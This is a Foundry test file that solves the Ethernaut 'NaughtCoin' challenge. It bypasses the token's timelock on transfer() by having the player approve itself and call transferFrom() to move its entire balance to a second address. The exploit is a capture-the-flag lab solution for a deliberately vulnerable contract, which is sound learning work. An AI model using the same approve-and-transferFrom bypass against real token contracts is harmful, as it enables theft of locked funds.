// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/15_NaughtCoin.sol";

contract NaughtCoinTest is Test {
    NaughtCoin instance;
    address player1;
    address player2;

    function setUp() public {
        player1 = vm.addr(1);
        player2 = vm.addr(2);
        instance = new NaughtCoin(player1);
    }

    function testattacker() public {
        vm.startPrank(player1, player1);

        uint256 playerBalance = instance.balanceOf(player1);
        instance.approve(player1, playerBalance);
        instance.transferFrom(player1, player2, playerBalance);

        assertEq(instance.balanceOf(player1), 0);
        assertEq(instance.balanceOf(player2), playerBalance);
        vm.stopPrank();
    }
}
